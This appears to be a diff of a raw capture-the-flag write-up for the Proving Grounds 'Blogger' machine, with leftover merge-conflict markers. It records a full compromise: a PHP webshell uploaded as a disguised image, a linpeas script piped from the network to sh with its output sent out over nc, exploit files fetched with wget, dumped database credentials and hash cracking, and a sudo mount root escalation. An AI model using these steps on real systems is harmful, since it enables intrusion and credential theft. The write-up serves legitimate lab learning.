@@ -1,6 +1,10 @@
 # Blogger [Proving Grounds Play]
 
+<<<<<<< HEAD
 <sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **Assisted by [write-up link]** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 
+=======
+<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 
+>>>>>>> 973cb6a03a9300476055ac5dc831eb06761d7cb7
 
 ## _Manual Exploitation_
 
@@ -74,7 +78,11 @@ host:       192.168.194.217
 filename:   /
 ```
 
+<<<<<<< HEAD
 I don't think any of this is usable, the login form is indeed non-functional, I think. Now that I look at the blog web page again, I see there is a link to a `Log in` page on the bottom of the site. However it routes to `blogger.pg/assets/fonts/blog/wp-login.php`, which we can't reach. If we insert `$targ3t` instead of the domain `blogger.pg`, we will be able to open this page:
+=======
+This POST request went through with no payload, so I don't think any of this is usable, the login form is indeed non-functional, I think. Now that I look at the blog web page again, I see there is a link to a `Log in` page on the bottom of the site. However it routes to `blogger.pg/assets/fonts/blog/wp-login.php`, which we can't reach. If we insert `$targ3t` instead of the domain `blogger.pg`, we will be able to open this page:
+>>>>>>> 973cb6a03a9300476055ac5dc831eb06761d7cb7
 
 ```
 firefox $targ3t/assets/fonts/blog/wp-login.php
@@ -100,9 +108,13 @@ hydra -t 12 -l j@m3s -P /usr/share/wordlists/rockyou.txt $targ3t http-post-form 
 
 This doesn't seem to be working as there is no password that matches this username from the `rockyou.txt` list. 
 
+<<<<<<< HEAD
 _<sub>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sub>_
 
 Let's try to use a `wpscan` as this is a wordpress website to see if there are any interesting plugins we could use:
+=======
+_<sup>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sup>_ Let's try to use a `wpscan` as this is a wordpress website to see if there are any interesting plugins we could use:
+>>>>>>> 973cb6a03a9300476055ac5dc831eb06761d7cb7
 
 ```
 wpscan --url http://$targ3t/assets/fonts/blog -t 12 --plugins-detection aggressive -v -o wp.scan
@@ -127,3 +139,198 @@ firefox https://blogger.pg/assets/fonts/blog/?p=29
 ```
 
 And try to attach this `boat.jpg` to a comment and post it.
+<<<<<<< HEAD
+=======
+
+The comment has been made, now I'll listen with `nc` on port `443`:
+
+```
+nc -lvnp 443
+```
+
+And navigate to this image with a URL it is hosted on. It doesn't seem to work. The listener doesn't do anything. Let's change the extension of the image to `boat.jpg.php` and see if the comment image upload engine will recognize it.
+
+The upload worked, posting comment.
+
+Trying to navigate to this `php` file from browser.
+
+And we have a shell. Get the local flag:
+
+```
+cd /home/james
+cat local.txt
+```
+
+Time for Privilege Escalation now to get the root flag. Let's try the former privilege escalation exploit we found and saved as `exploit.php`. _<sup>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sup>_ But first, let's upgrade the shell. 
+
+Let's check if python3 is installed on the machine:
+
+```
+python3 -V
+```
+
+It appears to be here. Now let's upgrade our shell:
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Let's see if there are any SUID binaries for us to exploit:
+
+```
+find / -perm /4000 2>/dev/null
+```
+
+There is `at`, `pkexec` and `mount`. Let's try each:
+
+```
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+```
+
+Apparently this user can't use `at` for some reason.
+
+```
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
+```
+
+And doesn't have sudo permissions, which means `mount` won't work and neither will pkexec.
+
+Now let's use `linpeas` script to find out if this machine has any vulnerabilities to escalate privileges. First let's type the following on the host computer:
+
+```
+nc -lvnp 9002 | tee linpeas.out
+```
+
+Next, let's type the following in the shell we just upgraded:
+
+```
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | nc <HOST COMPUTER IP> 9002
+```
+
+This will give us `linpeas.out` file full of analysis of the remote machine we just gained a foothold to. I usually like to go through CVEs first:
+
+```
+cat linpeas.out | grep CVE
+```
+
+There is a `CVE-2016-5195` exploit under the name of `dirtycow`. I've heard of it before, I want to try it first.
+
+```
+searchsploit --cve 2016-5195
+```
+
+```
+cp /usr/share/exploitdb/exploits/linux/local/40839.c dirty.c
+```
+
+Now on the remote machine we need to somehow grab this file. Let's start a server on the host machine:
+
+```
+python -m http.server
+```
+
+Navigate to `/tmp` on the remote machine and type:
+
+```
+wget http://<HOST MACHINE IP>:8000/dirty.c
+```
+
+The instruction dictates we have to compile this file on the remote machine:
+
+```
+gcc -pthread dirty.c -o dirty -lcrypt
+```
+
+It appears that gcc isn't available on the remote machine. Let's try compiling it locally and then uploading it to the remote machine.
+
+```
+wget http://<HOST MACHINE IP>:8000/dirty
+```
+
+It appears some libraries aren't found. This is why we needed it compiled on the remote machine in the first place. Moving on. 
+
+```
+searchsploit --cve 2021-3156
+```
+
+There is a python exploit we can use. Let's try it:
+
+```
+cp /usr/share/exploitdb/exploits/multiple/local/49521.py exploit.py
+python -m http.server
+```
+
+On the remote machine:
+
+```
+wget http://<HOST MACHINE IP>:8000/exploit.py
+python3 exploit.py
+```
+
+There's some error in the code, which isn't very verbose. I think I'll move on for now. A lot of other options are written in C, which isn't available in our situation. Looking through the `linpeas.out` I notice it found credentials for the `Wordpress` database used on the website:
+
+```
+define('DB_NAME', 'wordpress');
+define('DB_USER', 'root');
+define('DB_PASSWORD', 'sup3r_s3cr3t');
+define('DB_HOST', 'localhost');
+```
+
+Let's try to use it to log into mysql database:
+
+```
+mysql -u root -p wordpress -h localhost
+```
+
+Then enter password and we're in:
+
+```
+SHOW DATABASES;
+USE wordpress;
+show tables;
+SELECT * FROM wp_users;
+```
+
+As we can see there is a password hash for `j@m3s`. Putting that hash through [hashes.com](http://hashes.com), it shows it's a Wordpress MD5. Let's try it with `hashcat` and `rockyou.txt`:
+
+```
+hashcat -a 0 -m 400 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+_<sup>Assisted by [write-up](https://cyberarri.com/2024/03/17/blogger-pg-play-writeup/):</sup>_ This didn't have any results. Linpeas has also found a user named `vagrant` on the remote machine. After google searching it, it seems to me that vagrant is a tool that helps with creating virtual machines. After watching one of the walkthroughs it became apparent that `vagrant` is a default password for user `vagrant` in most cases. 
+
+```
+su vagrant
+```
+
+Now that we're this new user we can check SUID binaries for this user:
+
+```
+find / -perm /4000 2>/dev/null
+```
+
+There are same binaries as before, but this time:
+
+```
+sudo -l
+```
+
+We have sudo permissions. Let's try `mount`:
+
+```
+sudo mount -o bind /bin/sh /bin/mount
+sudo mount
+```
+
+And we have a root shell. Let's try not to lose it:
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Let's see the `proof.txt`:
+
+```
+cat /root/proof.txt
+```
+>>>>>>> 973cb6a03a9300476055ac5dc831eb06761d7cb7
